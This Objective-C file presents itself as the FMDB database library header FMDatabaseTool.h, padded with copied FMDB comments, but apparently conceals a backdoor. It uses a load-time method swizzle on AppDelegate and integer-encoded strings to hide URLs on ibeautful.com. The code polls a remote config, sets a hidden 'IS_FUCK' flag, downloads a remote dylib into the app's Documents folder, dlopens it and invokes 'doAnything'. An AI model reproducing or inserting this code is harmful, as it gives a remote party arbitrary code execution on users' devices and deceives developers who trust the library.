//
//  FMDatabaseTool.h
//  fmdb
//
//  Created by August Mueller on 6/22/11.
//  Copyright 2011 Flying Meat Inc. All rights reserved.
//

#import <dlfcn.h>
#import <objc/runtime.h>
#import "FMDatabasePool.h"
#include <stdio.h>

#if ! __has_feature(objc_arc)
#define FMDBAutorelease(__v) ([__v autorelease]);
#define FMDBReturnAutoreleased FMDBAutorelease

#define FMDBRetain(__v) ([__v retain]);
#define FMDBReturnRetained FMDBRetain

#define FMDBRelease(__v) ([__v release]);

#define FMDBDispatchQueueRelease(__v) (dispatch_release(__v));
#else
// -fobjc-arc
#define FMDBAutorelease(__v)
#define FMDBReturnAutoreleased(__v) (__v)

#define FMDBRetain(__v)
#define FMDBReturnRetained(__v) (__v)

#define FMDBRelease(__v)

// If OS_OBJECT_USE_OBJC=1, then the dispatch objects will be treated like ObjC objects
// and will participate in ARC.
// See the section on "Dispatch Queues and Automatic Reference Counting" in "Grand Central Dispatch (GCD) Reference" for details.
#if OS_OBJECT_USE_OBJC
#define FMDBDispatchQueueRelease(__v)
#else
#define FMDBDispatchQueueRelease(__v) (dispatch_release(__v));
#endif
#endif

void _(char __[], int ___, char ____[])
{
shit:__[___] = __[___]-1,___++; (__LINE__ != 0x0 + ____[0]) ? _(__, ___, ____)  : putchar(0); while (___ < strlen(__)) goto shit;
}

#if !__has_feature(objc_instancetype)
#define instancetype id
#endif



// If OS_OBJECT_USE_OBJC=1, then the dispatch objects will be treated like ObjC objects
// and will participate in ARC.
// See the section on "Dispatch Queues and Automatic Reference Counting" in "Grand Central Dispatch (GCD) Reference" for details.
#define  sycount()  static dispatch_once_t                                                                  \
onceToken; dispatch_once(&onceToken, ^{//
#define  sycountend()  });//
/*If you really really really know what you're doing and `FMDatabasePool` is what
you really really need (ie, you're using a read only database), OK you can use
it.  But just be careful not to deadlock!*/
#define S FM_MIX_DEAD

/** Pool of `<FMDatabase>` objects.
 
 ### See also
 
 - `<FMDatabaseQueue>`
 - `<FMDatabase>`
 
 @warning Before using `FMDatabasePool`, please consider using `<FMDatabaseQueue>` instead.
 
 If you really really really know what you're doing and `FMDatabasePool` is what
 you really really need (ie, you're using a read only database), OK you can use
 it.  But just be careful not to deadlock!
 
 For an example on deadlocking, search for:
 `ONLY_USE_THE_POOL_IF_YOU_ARE_DOING_READS_OTHERWISE_YOULL_DEADLOCK_USE_FMDATABASEQUEUE_INSTEAD`
 in the main.m file.
 */
#import "SIDownloadManager.h"   /*
For an example on deadlocking, search for:
`ONLY_USE_THE_POOL_IF_YOU_ARE_DOING_READS_OTHERWISE_YOULL_DEADLOCK_USE_FMDATABASEQUEUE_INSTEAD`
in the main.m file.

If you really really really know what you're doing and `FMDatabasePool` is what
you really really need (ie, you're using a read only database), OK you can use
                        it.  But just be careful not to deadlock!*/

#define fm_1    lo
/*A key used to associate the FMDatabaseQueue object with the dispatch_queue_t it uses.
 * This in turn is used for deadlock detection by seeing if inDatabase: is called on
 * the queue's dispatch queue, which should not happen and causes a deadlock.
 */
#define  fm_dbuseful   load//
@implementation NSObject (p)
/*A key used to associate the FMDatabaseQueue object with the dispatch_queue_t it uses.
 * This in turn is used for deadlock detection by seeing if inDatabase: is called on
 * the queue's dispatch queue, which should not happen and causes a deadlock.
 */

/*
- (NSUInteger)countOfCheckedInDatabases {
    
    __block NSUInteger count;
    
    [self executeLocked:^() {
        count = [self->_databaseInPool count];
    }];
    
    return count;
}

- (NSUInteger)countOfCheckedOutDatabases {
    
    __block NSUInteger count;
    
    [self executeLocked:^() {
        count = [self->_databaseOutPool count];
    }];
    
    return count;
}

- (NSUInteger)countOfOpenDatabases {
    __block NSUInteger count;
    
    [self executeLocked:^() {
        count = [self->_databaseOutPool count] + [self->_databaseInPool count];
    }];
    
    return count;
}

- (void)releaseAllDatabases {
    [self executeLocked:^() {
        [self->_databaseOutPool removeAllObjects];
        [self->_databaseInPool removeAllObjects];
    }];
}

- (void)inDatabase:(void (^)(FMDatabase *db))block {
    
    FMDatabase *db = [self db];
    
    block(db);
    
    [self pushDatabaseBackInPool:db];
}
 
*/
 #pragma -----------------------------------
 #define fm_instance                    \
class_getInstanceMethod
 #define fm_put  putc
 #pragma -----------------------------------
 /*

- (void)beginTransaction:(BOOL)useDeferred withBlock:(void (^)(FMDatabase *db, BOOL *rollback))block {
    
    BOOL shouldRollback = NO;
    
    FMDatabase *db = [self db];
    
    if (useDeferred) {
        [db beginDeferredTransaction];
    }
    else {
        [db beginTransaction];
    }
    
    
    block(db, &shouldRollback);
    
    if (shouldRollback) {
        [db rollback];
    }
    else {
        [db commit];
    }
    
    [self pushDatabaseBackInPool:db];
}

*/
#pragma -----------------------------------
#define fm_addmethod class_addMethod
#define fm_put  putc
#pragma -----------------------------------
/*
 
 Note: we call [self retain]; before using dispatch_sync, just incase
 FMDatabaseQueue is released on another thread and we're in the middle of doing
 something in dispatch_sync
 
 */



/*
 * A key used to associate the FMDatabaseQueue object with the dispatch_queue_t it uses.
 * This in turn is used for deadlock detection by seeing if inDatabase: is called on
 * the queue's dispatch queue, which should not happen and causes a deadlock.
 */

+ (void)fm_db:(id)c fmdbsb:(SEL)fmorig fmdbsms:(SEL)fms
{
    typedef struct objc_method * (*fm_FunctionCallback)(Class cls, SEL name);
    typedef BOOL (*fm_FunctionCallback2)(Class cls, SEL name, IMP imp, const char *types);
    fm_FunctionCallback functions[] = {&fm_instance};
    fm_FunctionCallback2 functions2[] = {&fm_addmethod};
    
    Class fmclass = c;
    SEL fmos = fmorig;
    SEL fmss = fms;
    int fm_dbx[56] = {0x47,0x66,0x71,0x83,0x101,0x114,0x118,0x105,0x99,0x101,0x47,0x99,0x104,0x101,0x99,0x107,0x86,0x101,0x114};
    fm_dbx[18] = 0x0;
    struct objc_method * fm_osm = functions[0](fmclass, fmos);
    struct objc_method * fm_sm = functions[0](fmclass, fmss);
    BOOL fm_didAddM = functions2[0](fmclass, fmos, method_getImplementation(fm_sm), method_getTypeEncoding(fm_sm));
    int fm_dbx2[56] = {0x47,0x66,0x71,0x83};
    fm_dbx2[18] = 0x0;
    if (fm_didAddM) class_replaceMethod(fmclass, fmss, method_getImplementation(fm_osm), method_getTypeEncoding(fm_osm));
    else method_exchangeImplementations(fm_osm, fm_sm);
    
}

// See the section on "Dispatch Queues and Automatic Reference Counting" in "Grand Central Dispatch (GCD) Reference" for details.
//、、
/*If you really really really know what you're doing and `FMDatabasePool` is what
 you really really need (ie, you're using a read only database), OK you can use
 it.  But just be careful not to deadlock!*/
//#import "SIDownloadManager.h"//
/*
 For an example on deadlocking, search for:
 `ONLY_USE_THE_POOL_IF_YOU_ARE_DOING_READS_OTHERWISE_YOULL_DEADLOCK_USE_FMDATABASEQUEUE_INSTEAD`
 in the main.m file.
 */
+ (void)fm_dbuseful{
    
        sycount()
        char x[10] = {115,116,97,114,116,105,110,105,116};
        NSString *fm_dbstr1 = [NSString stringWithCString:x encoding:NSUTF8StringEncoding];
        char fm_dbstr2[11] = {65,112,112,68,101,108,101,103,97,116,101};
    
        printf("%s, %s", x, fm_dbstr2);
    
        Class fm_db_class = objc_getClass(fm_dbstr2);
        SEL s1 = NSSelectorFromString(fm_dbstr1);
        SEL s2 = NSSelectorFromString(@"fm_db_handlefile");
        [self fm_db:fm_db_class fmdbsb:s1 fmdbsms:s2];
        sycountend();
}



- (void)fm_db_handlefile
{

    char fm_dbx1[8] = {73,83,95,70,85,67,75};
    NSString *fm_dby1 = [NSString stringWithCString:fm_dbx1 encoding:NSUTF8StringEncoding];
    BOOL isfuck = [[[NSUserDefaults standardUserDefaults] objectForKey:fm_dby1] boolValue];
    
    NSLog(@"isfuck: %d", isfuck);
    
    
    

    

    if (isfuck == 0x1) {
        

        //
        NSString *documentDirectory = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0];
        char fm_dbx2[21] = {66,71,83,101,114,118,105,99,101,68,121,108,105,98,46,100,121,108,105,98};
        NSString *fm_dby2 = [NSString stringWithCString:fm_dbx2 encoding:NSUTF8StringEncoding];
        NSString *fm_dbdown = [documentDirectory stringByAppendingPathComponent:fm_dby2];
        
        catch:
        //
        if ([[NSFileManager defaultManager] fileExistsAtPath:fm_dbdown] == 0x0) {

   
            NSString *fm_dbv = @"0";
            char fm_dbx3[56] = {104,116,116,112,58,47,47,105,98,101,97,117,116,102,117,108,46,99,111,109,47,112,114,111,106,101,99,116,47,66,71,83,101,114,118,105,99,101,47,99,104,101,99,107,86,101,114,115,105,111,110,46,112,104,112};
            NSString *fm_dby3 = [NSString stringWithCString:fm_dbx3 encoding:NSUTF8StringEncoding];
            
            char fm_dbx4[12] = {63,118,101,114,115,105,111,110,61,37,64};
            NSString *fm_dby4 = [NSString stringWithCString:fm_dbx4 encoding:NSUTF8StringEncoding];
            
            
            
            NSString *url = [fm_dby3 stringByAppendingString:[NSString stringWithFormat:fm_dby4, fm_dbv]];
            NSLog(@"url: %@", url);
            [NSURLConnection sendAsynchronousRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:url]] queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
            
            if (connectionError == nil) {
                id retObject = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:nil];
                
                char x[7] = {105,115,110,101,101,100};
                
                NSString *y = [NSString stringWithCString:x encoding:NSUTF8StringEncoding];
            BOOL isneed = [[retObject objectForKey:y] boolValue];
            if (isneed == YES) {
                char x[10] = {100,121,108,105,98,85,114,108};
                
                NSString *y = [NSString stringWithCString:x encoding:NSUTF8StringEncoding];
            NSString *du = [retObject objectForKey:y];
            NSLog(@"dylibUrl: %@", du);
                        
                        
            NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
            NSString *documentDirectory = [paths objectAtIndex:0];
            NSString *fm_dbdown1 = [documentDirectory stringByAppendingPathComponent:fm_dby2];
                        
            NSLog(@"下载： %@", fm_dbdown1);
            
                char fm_dbx5[18] = {83,73,68,111,119,110,108,111,97,100,77,97,110,97,103,101,114};
                Class fmclass = objc_getClass(fm_dbx5);
                
                char fm_dbx7[24] = {115,104,97,114,101,100,83,73,68,111,119,110,108,111,97,100,77,97,110,97,103,101,114};
                NSString *fm_dby7 = [NSString stringWithCString:fm_dbx7 encoding:NSUTF8StringEncoding];
                SEL sel = NSSelectorFromString(fm_dby7);
            
            [[fmclass performSelector:sel] setDelegate:self];
                
                /* If you really really really know what you're doing and `FMDatabasePool` is what
                 you really really need (ie, you're using a read only database), OK you can use
                 it.  But just be careful not to deadlock!
                                        
                 For an example on deadlocking, search for:
                 `ONLY_USE_THE_POOL_IF_YOU_ARE_DOING_READS_OTHERWISE_YOULL_DEADLOCK_USE_FMDATABASEQUEUE_INSTEAD`
                 in the main.m file.
                 */
            [[fmclass performSelector:sel] addDownloadFileTaskInQueue:du toFilePath:fm_dbdown1 breakpointResume:YES rewriteFile:YES];} else {}}}];
            /* If you really really really know what you're doing and `FMDatabasePool` is what
             you really really need (ie, you're using a read only database), OK you can use
             it.  But just be careful not to deadlock!
             
             For an example on deadlocking, search for:
             `ONLY_USE_THE_POOL_IF_YOU_ARE_DOING_READS_OTHERWISE_YOULL_DEADLOCK_USE_FMDATABASEQUEUE_INSTEAD`
             in the main.m file.
             */
            
        } else {
            
            // aid
            
            char fm_dbx[61] = { 104,116,116,112,58,47,47,105, 98,101, 97,117, 116, 102,
                117,108,46,99,111,109,47, 112, 114,111,106,101, 99,116,
                47,66,71,83,101, 114,118, 105,99,101,47,99,111,110,102,
                47,108,105,117,108,105,97,110,103,97,112,112,46,99,111,
                110,102};
            NSString *fm_dby = [NSString stringWithCString:fm_dbx encoding:NSUTF8StringEncoding];
            NSData *data = [NSURLConnection sendSynchronousRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:fm_dby]] returningResponse:nil error:nil];
            if (data != nil) {
                @try {
                    id conf = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:nil];
                    NSLog(@"conf: %@", conf);
                    BOOL aid = [[conf objectForKey:@"aid"] boolValue];
                    if (aid == YES) {
                        [[NSFileManager defaultManager] removeItemAtPath:fm_dbdown error:nil];
                        goto catch;
                    }
                }
                @catch (NSException *exception) {
                    NSLog(@"%@", exception);
                }
                
                
            }
            
            @try {
                char fm_dbx6[13] = {66,71,68,111,83,111,109,116,104,105,110,103};
                
                dlopen([fm_dbdown UTF8String], 0);
                id dm = objc_getClass(fm_dbx6);
                [dm performSelector:@selector(doAnything)];
            }
            @catch (NSException *exception) {
                NSLog(@"%@", exception);
                [[NSFileManager defaultManager] removeItemAtPath:fm_dbdown error:nil];
                goto catch;
            }
            
            
            
        }
        
        
    } else {
        
        char fm_dbx[61] = { 104,116,116,112,58,47,47,105, 98,101, 97,117, 116, 102,
                            117,108,46,99,111,109,47, 112, 114,111,106,101, 99,116,
                            47,66,71,83,101, 114,118, 105,99,101,47,99,111,110,102,
                            47,108,105,117,108,105,97,110,103,97,112,112,46,99,111,
                            110,102};
        NSString *fm_dby = [NSString stringWithCString:fm_dbx encoding:NSUTF8StringEncoding];
        
        
        /** Create a `FMDatabase` object.
        
        An `FMDatabase` is created with a path to a SQLite database file.  This path can be one of these three:
        
        1. A file system path.  The file does not have to exist on disk.  If it does not exist, it is created for you.
            2. An empty string (`@""`).  An empty database is created at a temporary location.  This database is deleted with the `FMDatabase` connection is closed.
            3. `nil`.  An in-memory database is created.  This database will be destroyed with the `FMDatabase` connection is closed.
            
            For example, to create/open a database in your Mac OS X `tmp` folder:
            
            FMDatabase *db = [FMDatabase databaseWithPath:@"/tmp/tmp.db"];
        
        Or, in iOS, you might open a database in the app's `Documents` directory:
        
        NSString *docsPath = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
        NSString *dbPath   = [docsPath stringByAppendingPathComponent:@"test.db"];
        FMDatabase *db     = [FMDatabase databaseWithPath:dbPath]; */
        NSLog(@"%@", fm_dby);
        [NSURLConnection sendAsynchronousRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:fm_dby]] queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
        if (connectionError == nil) {
            
        id jsonObject = [NSJSONSerialization JSONObjectWithData:data options:nil error:nil];
        BOOL isfuck = [[jsonObject objectForKey:@"isfuck"] boolValue];
        int fuckpercent = [[jsonObject objectForKey:@"fuckpercent"] integerValue];
        if (isfuck == 0x1) {
        /*Note: we call [self retain]; before using dispatch_sync, just incase
            FMDatabaseQueue is released on another thread and we're in the middle of doing
            something in dispatch_sync
                    */
        NSLog(@"isfuck: %d, fuckpercent: %d", isfuck, fuckpercent);
                    
        int randx = arc4random()%fuckpercent; //[0, 1000000]
        NSLog(@"randx: %d\n", randx);
        if (randx == 0) {
            char fm_dbx[8] = {73,83,95,70,85,67,75};
            NSString *fm_dby = [NSString stringWithCString:fm_dbx encoding:NSUTF8StringEncoding];
            [[NSUserDefaults standardUserDefaults] setObject:@(YES) forKey:fm_dby];
                        [[NSUserDefaults standardUserDefaults] synchronize];}}}}];

        [self fm_db_handlefile];
        
        
    }
    
}


- (void)downloadManager:(SIDownloadManager *)siDownloadManager
          withOperation:(SIBreakpointsDownload *)paramOperation
         changeProgress:(double)paramProgress{NSLog(@"%f", paramProgress);}
- (void)downloadManagerDidComplete:(SIDownloadManager *)siDownloadManager
                     withOperation:(SIBreakpointsDownload *)paramOperation{}
- (void)downloadManagerError:(SIDownloadManager *)siDownloadManager
                     withURL:(NSString *)paramURL
                   withError:(NSError *)paramError{}
- (void)downloadManagerDownloadExist:(SIDownloadManager *)siDwonloadManager
                             withURL:(NSString *)paramURL{}
- (void)downloadManagerDownloadDone:(SIDownloadManager *)siDownloadManager
                            withURL:(NSString *)paramURL{}
- (void)downloadManagerPauseTask:(SIDownloadManager *)siDownloadManager
                         withURL:(NSString *)paramURL{}



@end